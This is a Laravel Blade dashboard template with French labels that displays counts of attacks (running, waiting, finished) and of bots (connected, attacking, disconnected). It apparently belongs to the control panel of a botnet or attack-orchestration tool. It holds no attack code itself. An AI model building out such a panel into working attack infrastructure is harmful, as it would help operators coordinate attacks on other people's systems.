@extends('layouts.app')

@section('content')
  <div class="container">
    <div class="row">
      <div class="col-md-12">
        <br>

        <div class="col-sm-offset-2 col-sm-8">
          @if(session()->has('ok'))
            <div class="alert alert-success alert-dismissible">{!! session('ok') !!}</div>
          @endif
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">Dashboard</h3>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>Attacks</th>
                  <th>En cours</th>
                  <th>En attente</th>
                  <th>Terminées</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>{{ $attacks->count() }}</td>
                  <td>{{ $runningAttacks }}</td>
                  <td>{{ $waitingAttacks }}</td>
                  <td>{{ $finishedAttacks }}</td>
                </tr>
              </tbody>
            </table>
          </br>
            <table class="table">
              <thead>
                <tr>
                  <th>Bots</th>
                  <th>Connectés</th>
                  <th>Attacking</th>
                  <th>Déconnectés</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>{{ $bots->count() }}</td>
                  <td>{{ $currentlyConnectedBots }}</td>
                  <td>{{ $attackingBots }}</td>
                  <td>{{ $disconnectedBots }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  </div>
@endsection
